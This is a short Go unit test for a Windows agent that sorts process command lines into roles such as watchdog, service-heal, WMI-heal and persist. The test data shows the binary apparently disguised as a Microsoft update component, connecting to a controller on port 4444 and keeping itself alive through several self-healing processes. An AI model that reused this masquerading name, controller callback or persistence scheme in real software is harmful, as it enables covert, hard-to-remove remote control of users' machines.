//go:build windows

package main

import "testing"

// agentRole must never classify supervisors/services/healers as full
// agents: misclassification means the reaper kills its own watchdog.
func TestAgentRole(t *testing.T) {
	cases := []struct {
		cmdline string
		want    string
	}{
		{`"C:\ProgramData\Microsoft\Windows\Update\MicrosoftWindowsClient.exe" -controller h:4444 -ca "c"`, "full"},
		{`"C:\x\MicrosoftWindowsClient.exe" --watch`, "watch"},
		{`"C:\x\MicrosoftWindowsClient.exe" --svc-heal`, "svc"},
		{`"C:\x\MicrosoftWindowsClient.exe" --wmi-heal`, "wmi"},
		{`"C:\x\MicrosoftWindowsClient.exe" -test`, "test"},
		{`"C:\x\MicrosoftWindowsClient.exe" -persist`, "persist"},
		{`"C:\x\agent.exe" --watch`, "watch"},
		{`"C:\x\agent.exe"`, "full"},
	}
	for _, c := range cases {
		if got := agentRole(c.cmdline); got != c.want {
			t.Fatalf("agentRole(%q) = %q, want %q", c.cmdline, got, c.want)
		}
	}
}
